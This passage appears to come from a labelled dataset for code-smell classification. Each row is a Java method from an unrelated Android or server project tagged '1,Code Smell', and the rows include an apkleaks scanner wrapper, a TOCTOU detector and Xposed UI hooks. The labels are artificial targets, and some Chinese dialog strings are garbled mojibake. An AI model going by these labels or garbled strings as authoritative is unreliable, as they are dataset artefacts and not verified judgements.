  NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.onRequestPermissionResultReceived,requestCode,permissions,grantResults);
  if (requestedPermissions.get(requestCode,-1) >= 0) {
    int type=requestedPermissions.get(requestCode,-1);
    requestedPermissions.delete(requestCode);
    NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.permissionsGranted,type);
  }
}",1,Code Smell
"@Override public AlertDialog create(){
  if (!TextUtils.isEmpty(helpText) && !TextUtils.isEmpty(supportingText))   throw new IllegalStateException(""You can't have both help text and supporting text in the same alert"");
  if (!TextUtils.isEmpty(supportingText)) {
    View titleLayout=getContext().getSystemService(LayoutInflater.class).inflate(R.layout.alert_title_with_supporting_text,null);
    TextView title=titleLayout.findViewById(R.id.title);
    TextView subtitle=titleLayout.findViewById(R.id.subtitle);
    title.setText(this.title);
    subtitle.setText(supportingText);
    setCustomTitle(titleLayout);
  }
 else   if (!TextUtils.isEmpty(helpText)) {
    View titleLayout=getContext().getSystemService(LayoutInflater.class).inflate(R.layout.alert_title_with_help,null);
    TextView title=titleLayout.findViewById(R.id.title);
    TextView helpText=titleLayout.findViewById(R.id.help_text);
    View helpButton=titleLayout.findViewById(R.id.help);
    title.setText(this.title);
    helpText.setText(this.helpText);
    helpButton.setOnClickListener(v -> {
      helpText.setVisibility(helpText.getVisibility() == View.VISIBLE ? View.GONE : View.VISIBLE);
      helpButton.setSelected(helpText.getVisibility() == View.VISIBLE);
    }
);
    setCustomTitle(titleLayout);
  }
 else   if (!TextUtils.isEmpty(title)) {
    View titleLayout=getContext().getSystemService(LayoutInflater.class).inflate(R.layout.alert_title,null);
    TextView title=titleLayout.findViewById(R.id.title);
    title.setText(this.title);
    setCustomTitle(titleLayout);
  }
  alert=super.create();
  alert.create();
  Button btn=alert.getButton(AlertDialog.BUTTON_POSITIVE);
  if (btn != null) {
    View buttonBar=(View)btn.getParent();
    buttonBar.setPadding(V.dp(16),V.dp(16),V.dp(16),V.dp(16));
    ((View)buttonBar.getParent()).setPadding(0,0,0,0);
  }
  if (btn == null || btn.getVisibility() == View.GONE) {
    ListView list=alert.getListView();
    if (list != null) {
      list.setPadding(list.getPaddingLeft(),list.getPaddingTop(),list.getPaddingRight(),V.dp(24));
    }
  }
  int titleID=getContext().getResources().getIdentifier(""title_template"",""id"",""android"");
  if (titleID != 0) {
    View title=alert.findViewById(titleID);
    if (title != null) {
      int pad=V.dp(24);
      title.setPadding(pad,pad,pad,pad);
    }
  }
  int titleDividerID=getContext().getResources().getIdentifier(""titleDividerNoCustom"",""id"",""android"");
  if (titleDividerID != 0) {
    View divider=alert.findViewById(titleDividerID);
    if (divider != null) {
      divider.getLayoutParams().height=0;
    }
  }
  int scrollViewID=getContext().getResources().getIdentifier(""scrollView"",""id"",""android"");
  if (scrollViewID != 0) {
    View scrollView=alert.findViewById(scrollViewID);
    if (scrollView != null) {
      scrollView.setPadding(0,0,0,0);
    }
  }
  return alert;
}",1,Code Smell
"public static void createItemsChoiceDialog(Context context,String title,String positiveButtonName,String negativeButtonName,String neutralButtonName,boolean cancelable,@NonNull String[] items,final DialogSupports support){
  AlertDialog.Builder builder=new AlertDialog.Builder(context);
  if (title != null) {
    builder.setTitle(title);
  }
  if (positiveButtonName != null) {
    builder.setPositiveButton(positiveButtonName,(dialog,which) -> {
      if (support != null) {
        support.runWhenPositive();
      }
      dialog.dismiss();
    }
);
  }
  if (negativeButtonName != null) {
    builder.setNegativeButton(negativeButtonName,(dialog,which) -> {
      if (support != null) {
        support.runWhenNegative();
      }
      dialog.dismiss();
    }
);
  }
  if (neutralButtonName != null) {
    builder.setNegativeButton(neutralButtonName,(dialog,which) -> {
      if (support != null) {
        support.runWhenNeutral();
      }
      dialog.dismiss();
    }
);
  }
  builder.setCancelable(cancelable);
  builder.setItems(items,(dialog,which) -> {
    if (support != null) {
      support.runWhenItemsSelected(which);
    }
  }
);
  builder.show();
}
",1,Code Smell
"private StringBuilder innAddOrUpdGroupResCtrlConf(HttpServletRequest req,StringBuilder sBuffer,ProcessResult result,boolean isAddOp){
  if (!WebParameterUtils.getAUDBaseInfo(req,isAddOp,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  BaseEntity opEntity=(BaseEntity)result.getRetData();
  if (!WebParameterUtils.getStringParamValue(req,WebFieldDef.COMPSGROUPNAME,true,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  final Set<String> batchGroupNames=(Set<String>)result.getRetData();
  if (!WebParameterUtils.getEnableStatusValue(req,WebFieldDef.RESCHECKENABLE,false,(isAddOp ? EnableStatus.STATUS_DISABLE : null),sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  EnableStatus resCheckEnable=(EnableStatus)result.getRetData();
  if (!WebParameterUtils.getIntParamValue(req,WebFieldDef.ALWDBCRATE,false,(isAddOp ? TServerConstants.GROUP_BROKER_CLIENT_RATE_MIN : TBaseConstants.META_VALUE_UNDEFINED),TServerConstants.GROUP_BROKER_CLIENT_RATE_MIN,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  int allowedBClientRate=(int)result.getRetData();
  ClusterSettingEntity defClusterSetting=defMetaDataService.getClusterDefSetting(false);
  if (!WebParameterUtils.getQryPriorityIdParameter(req,false,(isAddOp ? defClusterSetting.getQryPriorityId() : TBaseConstants.META_VALUE_UNDEFINED),TServerConstants.QRY_PRIORITY_MIN_VALUE,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  int qryPriorityId=(int)result.getRetData();
  if (!WebParameterUtils.getEnableStatusValue(req,WebFieldDef.FLOWCTRLENABLE,false,(isAddOp ? EnableStatus.STATUS_DISABLE : null),sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  EnableStatus flowCtrlEnable=(EnableStatus)result.getRetData();
  int flowRuleCnt=WebParameterUtils.getAndCheckFlowRules(req,(isAddOp ? TServerConstants.BLANK_FLOWCTRL_RULES : null),sBuffer,result);
  if (!result.isSuccess()) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  String flowCtrlInfo=(String)result.getRetData();
  List<GroupProcessResult> retInfo=new ArrayList<>();
  for (  String groupName : batchGroupNames) {
    retInfo.add(defMetaDataService.addOrUpdGroupCtrlConf(isAddOp,opEntity,groupName,resCheckEnable,allowedBClientRate,qryPriorityId,flowCtrlEnable,flowRuleCnt,flowCtrlInfo,sBuffer,result));
  }
  return buildRetInfo(retInfo,sBuffer);
}
",1,Code Smell
"public static void doInitAndSetupHookForeground(@NonNull Context context,@NonNull IDynamicHook hook){
  final CustomDialog[] pDialog=new CustomDialog[1];
  Throwable err=null;
  boolean isSuccessful=true;
  DexDeobfsProvider.INSTANCE.enterDeobfsSection();
  try (DexDeobfsBackend backend=DexDeobfsProvider.INSTANCE.getCurrentBackend()){
    if (hook.isPreparationRequired()) {
      Step[] steps=hook.makePreparationSteps();
      if (steps != null) {
        for (        Step s : steps) {
          if (s.isDone()) {
            continue;
          }
          final String name=s.getDescription();
          SyncUtils.runOnUiThread(() -> {
            if (pDialog[0] == null) {
              pDialog[0]=CustomDialog.createFailsafe(context);
              pDialog[0].setCancelable(false);
              pDialog[0].setTitle(""璇风◢鍊�"");
              pDialog[0].setMessage(""姝ｅ湪鍒濆鍖�..."");
              pDialog[0].show();
            }
            pDialog[0].setMessage(""QAuxiliary "" + BuildConfig.VERSION_NAME + "" 姝ｅ湪鍒濆鍖�:\n""+ name+ ""\n姣忎釜绫讳竴鑸笉浼氳秴杩囦竴鍒嗛挓"");
          }
);
          s.step();
        }
      }
    }
  }
 catch (  Throwable stepErr) {
    if (hook instanceof RuntimeErrorTracer) {
      ((RuntimeErrorTracer)hook).traceError(stepErr);
    }
    err=stepErr;
    isSuccessful=false;
  }
 finally {
    DexDeobfsProvider.INSTANCE.exitDeobfsSection();
  }
  if (isSuccessful) {
    if (hook.isTargetProcess()) {
      boolean success=false;
      try {
        success=hook.initialize();
      }
 catch (      Throwable ex) {
        err=ex;
      }
      if (!success) {
        SyncUtils.runOnUiThread(() -> Toasts.error(context,""鍒濆鍖栧け璐�""));
      }
    }
    SyncUtils.requestInitHook(HookInstaller.getHookIndex(hook),hook.getTargetProcesses());
  }
  if (err != null) {
    Throwable finalErr=err;
    SyncUtils.runOnUiThread(() -> CustomDialog.createFailsafe(context).setTitle(""鍙戠敓閿欒"").setMessage(finalErr.toString()).setCancelable(true).setPositiveButton(android.R.string.ok,null).show());
  }
  if (pDialog[0] != null) {
    SyncUtils.runOnUiThread(() -> pDialog[0].dismiss());
  }
}",1,Code Smell
"/** 
 * Writes all files to the zip, sorting/packing if necessary. The central directory and EOCD are deleted. When this method finishes, all entries have been written to the file and are properly aligned.
 */
private void writeAllFilesToZip() throws IOException {
  reopenRw();
  if (autoSortFiles) {
    sortZipContents();
  }
 else {
    packIfNecessary();
  }
  deleteDirectoryAndEocd();
  map.truncate();
  if (coverEmptySpaceUsingExtraField) {
    for (    FileUseMapEntry<StoredEntry> entry : new HashSet<>(entries.values())) {
      StoredEntry storedEntry=entry.getStore();
      Preconditions.checkNotNull(storedEntry,""Entry at %s is null"",entry.getStart());
      FileUseMapEntry<?> before=map.before(entry);
      if (before == null || !before.isFree()) {
        continue;
      }
      int localExtraSize=storedEntry.getLocalExtra().size() + Ints.checkedCast(before.getSize());
      Verify.verify(localExtraSize <= MAX_LOCAL_EXTRA_FIELD_CONTENTS_SIZE);
      storedEntry.loadSourceIntoMemory();
      long newStart=before.getStart();
      long newSize=entry.getSize() + before.getSize();
      String name=storedEntry.getCentralDirectoryHeader().getName();
      map.remove(entry);
      Verify.verify(entry == entries.remove(name));
      ImmutableList<ExtraField.Segment> currentSegments;
      try {
        currentSegments=storedEntry.getLocalExtra().getSegments();
      }
 catch (      IOException e) {
        currentSegments=ImmutableList.of();
      }
      List<ExtraField.Segment> extraFieldSegments=new ArrayList<>();
      int newExtraFieldSize=0;
      for (      ExtraField.Segment segment : currentSegments) {
        if (segment.getHeaderId() != ExtraField.ALIGNMENT_ZIP_EXTRA_DATA_FIELD_HEADER_ID) {
          extraFieldSegments.add(segment);
          newExtraFieldSize+=segment.size();
        }
      }
      int spaceToFill=Ints.checkedCast(before.getSize() + storedEntry.getLocalExtra().size() - newExtraFieldSize);
      extraFieldSegments.add(new ExtraField.AlignmentSegment(chooseAlignment(storedEntry),spaceToFill));
      storedEntry.setLocalExtraNoNotify(new ExtraField(ImmutableList.copyOf(extraFieldSegments)));
      entries.put(name,map.add(newStart,newStart + newSize,storedEntry));
      storedEntry.getCentralDirectoryHeader().setOffset(-1);
    }
  }
  TreeMap<FileUseMapEntry<?>,StoredEntry> toWriteToStore=new TreeMap<>(FileUseMapEntry.COMPARE_BY_START);
  for (  FileUseMapEntry<StoredEntry> entry : entries.values()) {
    StoredEntry entryStore=entry.getStore();
    Preconditions.checkNotNull(entryStore,""Entry at %s is null"",entry.getStart());
    if (entryStore.getCentralDirectoryHeader().getOffset() == -1) {
      toWriteToStore.put(entry,entryStore);
    }
  }
  for (  FileUseMapEntry<?> freeArea : map.getFreeAreas()) {
    toWriteToStore.put(freeArea,null);
  }
  byte[] chunk=new byte[IO_BUFFER_SIZE];
  for (  FileUseMapEntry<?> fileUseMapEntry : toWriteToStore.keySet()) {
    StoredEntry entry=toWriteToStore.get(fileUseMapEntry);
    if (entry == null) {
      int size=Ints.checkedCast(fileUseMapEntry.getSize());
      directWrite(fileUseMapEntry.getStart(),new byte[size]);
    }
 else {
      writeEntry(entry,fileUseMapEntry.getStart(),chunk);
    }
  }
}",1,Code Smell
"public ApkReport analyzeLeaks(ApkReport report,String apkPath,Map<String,String> sensitiveWords,Logger logger){
  logger.info(""start to analyze apk by apkleaks: {}"",apkPath);
  int code=-1;
  File apk=new File(apkPath);
  if (!apk.exists()) {
    throw new RuntimeException(""apk not exist"");
  }
  String name=apk.getName();
  String itemName=name.replace("".apk"","""");
  String reportPrefix=itemName + ""leak_report"";
  File reportFile=new File(workingDir,reportPrefix + "".json"");
  if (reportFile.exists()) {
    reportFile.delete();
  }
  Runtime runtime=Runtime.getRuntime();
  Process process=null;
  try {
    String error="""";
    FileInputStream input=new FileInputStream(configTemplate);
    String content=IOUtils.toString(input,CHARSET);
    JSONObject jsonObject=JSONObject.parseObject(content);
    for (    Map.Entry<String,String> entry : sensitiveWords.entrySet()) {
      jsonObject.put(entry.getKey(),entry.getValue());
    }
    input.close();
    String newConfigFileName=itemName + ""leak_config.json"";
    File newConfigFile=new File(workingDir,newConfigFileName);
    if (newConfigFile.exists()) {
      newConfigFile.delete();
    }
    FileOutputStream fileOutputStream=new FileOutputStream(newConfigFile);
    IOUtils.write(jsonObject.toJSONString(),fileOutputStream,CHARSET);
    fileOutputStream.close();
    String command=String.format(""apkleaks -f %s -p %s -o %s --json"",apk.getAbsoluteFile(),newConfigFile.getAbsolutePath(),reportFile.getAbsolutePath());
    process=runtime.exec(command,null,workingDir);
    try (InputStream inputStream=process.getInputStream();InputStream errorStream=process.getErrorStream();BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(inputStream))){
      String line;
      while ((line=bufferedReader.readLine()) != null) {
        logger.info(line);
      }
      code=process.waitFor();
      logger.info(""apkleaks exec finished code: {}"",code);
      error=IOUtils.toString(errorStream,CHARSET);
    }
  finally {
      if (process != null) {
        process.destroy();
      }
    }
    try {
      configTemplate.delete();
    }
 catch (    Exception e) {
      logger.error(""delete config file failed"",e);
    }
    if (code == 0 && reportFile.exists()) {
      report.addReportFile(reportFile.getName());
      return getLeaksFromJsonReport(report,reportFile);
    }
    logger.error(""error in apk leaks: {}"",error);
    throw new RuntimeException(error);
  }
 catch (  InterruptedException e) {
    logger.error(""Interrupted in APK leaks scan"",e);
    throw new RuntimeException(e);
  }
catch (  IOException e) {
    logger.error(""error in APK leaks scan"",e);
    throw new RuntimeException(e);
  }
}",1,Code Smell
"@Override public boolean check(){
  boolean hasWarning=false;
  try {
    SymbolTable symbolTable=GlobalState.currentProgram.getSymbolTable();
    if (symbolTable == null) {
      Logging.debug(""Empty symbols table"");
      return false;
    }
    Function entryFunction=null;
    if (GlobalState.config.getEntryAddress() != null) {
      entryFunction=GlobalState.flatAPI.getFunctionAt(GlobalState.flatAPI.toAddr(GlobalState.config.getEntryAddress()));
    }
 else {
      List<Function> mainFunctions=GlobalState.flatAPI.getGlobalFunctions(""main"");
      if (mainFunctions.isEmpty()) {
        return false;
      }
      entryFunction=mainFunctions.get(0);
    }
    CallGraph callGraph=CallGraph.getCallGraph(entryFunction);
    ArrayList<Symbol> accessSymbols=new ArrayList<>();
    ArrayList<Symbol> openSymbols=new ArrayList<>();
    for (    Symbol symbol : symbolTable.getAllSymbols(true)) {
      if (accessName.contains(symbol.getName()) && symbol.hasReferences() && !isSymbolThunk(symbol)) {
        Logging.debug(""Has \"""" + symbol.getName() + ""()\"" symbol at ""+ symbol.getAddress());
        accessSymbols.add(symbol);
      }
      if (openName.equals(symbol.getName()) && symbol.hasReferences() && !isSymbolThunk(symbol)) {
        Logging.debug(""Has \"""" + openName + ""()\"" symbol at ""+ symbol.getAddress());
        openSymbols.add(symbol);
      }
    }
    for (    Symbol symbol : accessSymbols) {
      for (      Reference ref : symbol.getReferences()) {
        Address fromAddress=ref.getFromAddress();
        Logging.debug(fromAddress + ""->"" + ref.getToAddress());
        Function caller=GlobalState.flatAPI.getFunctionContaining(fromAddress);
        if (caller == null) {
          continue;
        }
        Logging.debug(""\"""" + symbol.getName() + ""()\"" called at ""+ fromAddress.toString()+ "" from \""""+ caller.getName()+ ""()\"" function"");
        Logging.debug(""Checking path from \"""" + caller.getName() + ""()\"" to \""""+ openName+ ""()\"""");
        ArrayList<Address> addresses=hasPathToSymbols(callGraph,caller,openSymbols);
        for (        Address address : addresses) {
          CWEReport report=getNewReport(""Possible TOCTOU combination \"""" + symbol.getName() + ""()\"" and \""""+ openName+ ""()\"""").setAddress(address);
          Logging.report(report);
          hasWarning=true;
        }
      }
    }
  }
 catch (  Exception exception) {
    exception.printStackTrace();
  }
  return hasWarning;
}",1,Code Smell
"@Override public void init(){
  if (!mobileTypeSingle) {
    mResHook.setDensityReplacement(""com.android.systemui"",""dimen"",""status_bar_mobile_type_half_to_top_distance"",3);
    mResHook.setDensityReplacement(""com.android.systemui"",""dimen"",""status_bar_mobile_left_inout_over_strength"",0);
    mResHook.setDensityReplacement(""com.android.systemui"",""dimen"",""status_bar_mobile_type_middle_to_strength_start"",-0.4f);
  }
  HashMap<String,Integer> dualSignalResMap=new HashMap<>();
  String[] colorModeList={"""",""dark"",""tint""};
  findAndHookMethod(""com.android.systemui.SystemUIApplication"",""onCreate"",new MethodHook(){
    private boolean isHooked=false;
    @Override protected void after(    MethodHookParam param) throws Throwable {
      if (!isHooked) {
        isHooked=true;
        Context mContext=(Context)XposedHelpers.callMethod(param.thisObject,""getApplicationContext"");
        Resources modRes=getModuleRes(mContext);
        for (int slot=1; slot <= 2; slot++) {
          for (int lvl=0; lvl <= 5; lvl++) {
            for (            String colorMode : colorModeList) {
              String colorModeEq=!colorMode.isEmpty() ? (""_"" + colorMode) : """";
              if (selectedIconTheme == 1) {
                String dualIconResName=""statusbar_signal_classic_"" + slot + ""_""+ lvl+ colorModeEq;
                int iconResId=modRes.getIdentifier(dualIconResName,""drawable"",ProjectApi.mAppModulePkg);
                dualSignalResMap.put(dualIconResName,iconResId);
              }
 else               if (selectedIconTheme == 2) {
                if (!selectedIconStyle.equals(""theme"") || !colorMode.equals(""tint"")) {
                  String dualIconResName=""statusbar_signal_oa_"" + slot + ""_""+ lvl+ colorModeEq+ (!selectedIconStyle.isEmpty() ? (""_"" + selectedIconStyle) : """");
                  int iconResId=modRes.getIdentifier(dualIconResName,""drawable"",ProjectApi.mAppModulePkg);
                  dualSignalResMap.put(dualIconResName,iconResId);
                }
              }
            }
          }
        }
      }
    }
  }
);
  setDualRowIcon();
  getMobileLevel();
  resetImageDrawable(dualSignalResMap);
  setDualRowStyle();
}",1,Code Smell
"private static Expression parseAccessOrCallOrLiteral(TokenStream stream){
  if (stream.match(TokenType.Identifier,false)) {
    return parseAccessOrCall(stream,TokenType.Identifier);
  }
 else   if (stream.match(TokenType.LeftCurly,false)) {
    return parseMapLiteral(stream);
  }
 else   if (stream.match(TokenType.LeftBracket,false)) {
    return parseListLiteral(stream);
  }
 else   if (stream.match(TokenType.StringLiteral,false)) {
    if (stream.hasNext()) {
      if (stream.next().getType() == TokenType.Period) {
        stream.prev();
        return parseAccessOrCall(stream,TokenType.StringLiteral);
      }
      stream.prev();
    }
    return new StringLiteral(stream.expect(TokenType.StringLiteral).getSpan());
  }
 else   if (stream.match(TokenType.BooleanLiteral,false)) {
    return new BooleanLiteral(stream.expect(TokenType.BooleanLiteral).getSpan());
  }
 else   if (stream.match(TokenType.DoubleLiteral,false)) {
    return new DoubleLiteral(stream.expect(TokenType.DoubleLiteral).getSpan());
  }
 else   if (stream.match(TokenType.FloatLiteral,false)) {
    return new FloatLiteral(stream.expect(TokenType.FloatLiteral).getSpan());
  }
 else   if (stream.match(TokenType.ByteLiteral,false)) {
    return new ByteLiteral(stream.expect(TokenType.ByteLiteral).getSpan());
  }
 else   if (stream.match(TokenType.ShortLiteral,false)) {
    return new ShortLiteral(stream.expect(TokenType.ShortLiteral).getSpan());
  }
 else   if (stream.match(TokenType.IntegerLiteral,false)) {
    return new IntegerLiteral(stream.expect(TokenType.IntegerLiteral).getSpan());
  }
 else   if (stream.match(TokenType.LongLiteral,false)) {
    return new LongLiteral(stream.expect(TokenType.LongLiteral).getSpan());
  }
 else   if (stream.match(TokenType.CharacterLiteral,false)) {
    return new CharacterLiteral(stream.expect(TokenType.CharacterLiteral).getSpan());
  }
 else   if (stream.match(TokenType.NullLiteral,false)) {
    return new NullLiteral(stream.expect(TokenType.NullLiteral).getSpan());
  }
 else {
    ExpressionError.error(""Expected a variable, field, map, array, function or method call, or literal."",stream);
    return null;
  }
}
",1,Code Smell
"@Override public Model<Label> train(Dataset<Label> examples,Map<String,Provenance> runProvenance){
  return train(examples,runProvenance,INCREMENT_INVOCATION_COUNT);
}
@Override public Model<Label> train(Dataset<Label> examples,Map<String,Provenance> runProvenance,int invocationCount){
  if (examples.getOutputInfo().getUnknownCount() > 0) {
    throw new IllegalArgumentException(""The supplied Dataset contained unknown Outputs, and this Trainer is supervised."");
  }
  ImmutableOutputInfo<Label> labelInfos=examples.getOutputIDInfo();
  ImmutableFeatureMap featureInfos=examples.getFeatureIDMap();
  Map<Integer,Map<Integer,Double>> labelWeights=new HashMap<>();
  for (  Pair<Integer,Label> label : labelInfos) {
    labelWeights.put(label.getA(),new HashMap<>());
  }
  for (  Example<Label> ex : examples) {
    int idx=labelInfos.getID(ex.getOutput());
    Map<Integer,Double> featureMap=labelWeights.get(idx);
    double curWeight=ex.getWeight();
    for (    Feature feat : ex) {
      if (feat.getValue() < 0.0) {
        throw new IllegalStateException(""Multinomial Naive Bayes requires non-negative features. Found feature "" + feat.toString());
      }
      featureMap.merge(featureInfos.getID(feat.getName()),curWeight * feat.getValue(),Double::sum);
    }
  }
  if (invocationCount != INCREMENT_INVOCATION_COUNT) {
    setInvocationCount(invocationCount);
  }
  TrainerProvenance trainerProvenance=getProvenance();
  ModelProvenance provenance=new ModelProvenance(MultinomialNaiveBayesModel.class.getName(),OffsetDateTime.now(),examples.getProvenance(),trainerProvenance,runProvenance);
  trainInvocationCount++;
  SparseVector[] labelVectors=new SparseVector[labelInfos.size()];
  for (int i=0; i < labelInfos.size(); i++) {
    SparseVector sv=SparseVector.createSparseVector(featureInfos.size(),labelWeights.get(i));
    double unsmoothedZ=sv.oneNorm();
    sv.foreachInPlace(d -> Math.log((d + alpha) / (unsmoothedZ + (featureInfos.size() * alpha))));
    labelVectors[i]=sv;
  }
  DenseSparseMatrix labelWordProbs=DenseSparseMatrix.createFromSparseVectors(labelVectors);
  return new MultinomialNaiveBayesModel("""",provenance,featureInfos,labelInfos,labelWordProbs,alpha);
}",1,Code Smell
"Workspace parse(DslParserContext context,Tokens tokens){
  Workspace workspace=new Workspace(""Name"",""Description"");
  workspace.getModel().setImpliedRelationshipsStrategy(new CreateImpliedRelationshipsUnlessAnyRelationshipExistsStrategy());
  if (tokens.hasMoreThan(SECOND_INDEX)) {
    throw new RuntimeException(""Too many tokens, expected: "" + GRAMMAR_STANDALONE + "" or ""+ GRAMMAR_EXTENDS);
  }
  if (tokens.includes(FIRST_INDEX)) {
    String firstToken=tokens.get(FIRST_INDEX);
    if (StructurizrDslTokens.EXTENDS_TOKEN.equals(firstToken)) {
      if (tokens.includes(SECOND_INDEX)) {
        String source=tokens.get(SECOND_INDEX);
        try {
          if (source.startsWith(""https://"")) {
            if (source.endsWith("".json"")) {
              String json=readFromUrl(source);
              workspace=WorkspaceUtils.fromJson(json);
              registerIdentifiers(workspace,context);
            }
 else {
              String dsl=readFromUrl(source);
              StructurizrDslParser structurizrDslParser=new StructurizrDslParser();
              structurizrDslParser.parse(context,dsl);
              workspace=structurizrDslParser.getWorkspace();
            }
          }
 else {
            if (context.isRestricted()) {
              throw new RuntimeException(""Cannot import workspace from a file when running in restricted mode"");
            }
            if (context.getFile() != null) {
              File file=new File(context.getFile().getParent(),source);
              if (!file.exists()) {
                throw new RuntimeException(file.getCanonicalPath() + "" could not be found"");
              }
              if (file.isDirectory()) {
                throw new RuntimeException(file.getCanonicalPath() + "" should be a single file"");
              }
              if (source.endsWith("".json"")) {
                workspace=WorkspaceUtils.loadWorkspaceFromJson(file);
                registerIdentifiers(workspace,context);
              }
 else {
                StructurizrDslParser structurizrDslParser=new StructurizrDslParser();
                structurizrDslParser.parse(context,file);
                workspace=structurizrDslParser.getWorkspace();
              }
            }
          }
        }
 catch (        Exception e) {
          throw new RuntimeException(e.getMessage());
        }
      }
 else {
        throw new RuntimeException(""Expected: "" + GRAMMAR_EXTENDS);
      }
    }
 else {
      workspace.setName(firstToken);
      if (tokens.includes(SECOND_INDEX)) {
        workspace.setDescription(tokens.get(SECOND_INDEX));
      }
    }
  }
  return workspace;
}
",1,Code Smell
"private void drawClickView(Graphics2D graphics2D,WView view,int index){
  if (view != null) {
    int left=CoordinateUtils.convertPhoneXToPanelX(mApplication,view.getDrawLeft());
    int top=CoordinateUtils.convertPhoneYToPanelY(mApplication,view.getDrawTop());
    int width=CoordinateUtils.convertPhoneDistanceToPanelDistance(mApplication,view.getDrawRight() - view.getDrawLeft());
    int height=CoordinateUtils.convertPhoneDistanceToPanelDistance(mApplication,view.getDrawBottom() - view.getDrawTop());
    if (left + width == getWidth()) {
      width-=1;
    }
    if (top + height == getRealHeight()) {
      height-=1;
    }
    if (view.equals(mClickedView) && mCurrentMode == SearchableJTree.MODE_CONTROL && !mCurrentViewList.isEmpty()) {
      graphics2D.setColor(mSelectViewBgColor);
      graphics2D.fillRect(left,top,width,height);
      graphics2D.setColor(Color.RED);
      graphics2D.drawString(""Z: "" + index + "", ""+ StringUtils.getSimpleName(view.getClassName()),left + 2,top + height - 4);
      graphics2D.setColor(Color.GREEN);
      graphics2D.drawRect(left,top,width,height);
    }
 else     if (mCurrentMode == SearchableJTree.MODE_SHIFT && !mCurrentViewList.isEmpty()) {
      if (view.equals(mClickedView)) {
        graphics2D.setColor(Color.cyan);
        graphics2D.drawRect(left,top,width,height);
      }
 else       if ((mCurrentViewList.size() > 1 && view.equals(mCurrentViewList.get(mCurrentViewList.size() - 2))) || (mCurrentViewList.size() > 0 && view.equals(mCurrentViewList.get(mCurrentViewList.size() - 1)))) {
        graphics2D.setColor(Color.GREEN);
        graphics2D.drawRect(left,top,width,height);
      }
 else {
        graphics2D.setColor(getDrawRectColor(left,top,width,height,sColors));
        graphics2D.drawRect(left,top,width,height);
      }
    }
 else {
      graphics2D.setColor(getDrawRectColor(left,top,width,height,sColors));
      graphics2D.drawRect(left,top,width,height);
    }
    if (mCurrentMode != SearchableJTree.MODE_SHIFT && CodeLocatorUserConfig.loadConfig().isDrawViewSize()) {
      drawViewSizeText(graphics2D,view,left,top,width,height);
    }
    if ((view.isRealClickable() || view.isLongClickable()) && mCurrentMode == SearchableJTree.MODE_NORMAL && showClickableArea) {
      Rectangle rect=getClickableAreaRect(view);
      int drawLeft=CoordinateUtils.convertPhoneXToPanelX(mApplication,rect.x);
      int drawTop=CoordinateUtils.convertPhoneYToPanelY(mApplication,rect.y);
      int drawWidth=CoordinateUtils.convertPhoneDistanceToPanelDistance(mApplication,rect.width);
      int drawHeight=CoordinateUtils.convertPhoneDistanceToPanelDistance(mApplication,rect.height);
      graphics2D.setColor(Color.orange);
      graphics2D.drawRect(drawLeft,drawTop,drawWidth,drawHeight);
      graphics2D.setColor(mClickableAreaBgColor);
      graphics2D.fillRect(drawLeft,drawTop,drawWidth,drawHeight);
    }
    if (!mDrawPaddingMargin || !view.equals(mClickedView)) {
      return;
    }
    drawViewMargin(graphics2D,view,left,top,width,height);
    drawViewPadding(graphics2D,view,left,top,width,height);
  }
}",1,Code Smell
"private void createCamera(final int index,final SurfaceTexture surfaceTexture){
  AndroidUtilities.runOnUIThread(() -> {
    if (cameraThread == null) {
      return;
    }
    if (BuildVars.LOGS_ENABLED) {
      FileLog.d(""InstantCamera create camera session "" + index);
    }
    if (useCamera2) {
      if (bothCameras) {
        if (camera2Sessions[index] != null) {
          camera2Sessions[index].open(surfaceTexture);
        }
      }
 else {
        if (index == 1)         return;
        cameraThread.setCurrentSession(camera2SessionCurrent);
        camera2SessionCurrent.open(surfaceTexture);
      }
    }
 else {
      if (index == 1)       return;
      surfaceTexture.setDefaultBufferSize(previewSize[0].getWidth(),previewSize[0].getHeight());
      cameraSession=new CameraSession(selectedCamera,previewSize[0],pictureSize,ImageFormat.JPEG,true);
      cameraThread.setCurrentSession(cameraSession);
      CameraController.getInstance().openRound(cameraSession,surfaceTexture,() -> {
        if (cameraSession != null) {
          boolean updateScale=false;
          try {
            Camera.Size size=cameraSession.getCurrentPreviewSize();
            if (size.width != previewSize[0].getWidth() || size.height != previewSize[0].getHeight()) {
              previewSize[0]=new Size(size.width,size.height);
              FileLog.d(""InstantCamera change preview size to w = "" + previewSize[0].getWidth() + "" h = ""+ previewSize[0].getHeight());
            }
          }
 catch (          Exception e) {
            FileLog.e(e);
          }
          try {
            Camera.Size size=cameraSession.getCurrentPictureSize();
            if (size.width != pictureSize.getWidth() || size.height != pictureSize.getHeight()) {
              pictureSize=new Size(size.width,size.height);
              FileLog.d(""InstantCamera change picture size to w = "" + pictureSize.getWidth() + "" h = ""+ pictureSize.getHeight());
              updateScale=true;
            }
          }
 catch (          Exception e) {
            FileLog.e(e);
          }
          if (BuildVars.LOGS_ENABLED) {
            FileLog.d(""InstantCamera camera initied"");
          }
          cameraSession.setInitied();
          if (updateScale) {
            if (cameraThread != null) {
              cameraThread.reinitForNewCamera();
            }
          }
        }
      }
,() -> {
        if (cameraThread != null) {
          cameraThread.setCurrentSession(cameraSession);
        }
      }
);
    }
  }
);
}",1,Code Smell
"private int scrollDirectionPrimary(int da){
  if (TRACE)   TraceCompat.beginSection(""scrollPrimary"");
  if ((mFlag & PF_SLIDING) == 0 && (mFlag & PF_STAGE_MASK) != PF_STAGE_LAYOUT) {
    if (da > 0) {
      if (!mWindowAlignment.mainAxis().isMaxUnknown()) {
        int maxScroll=mWindowAlignment.mainAxis().getMaxScroll();
        if (da > maxScroll) {
          da=maxScroll;
        }
      }
    }
 else     if (da < 0) {
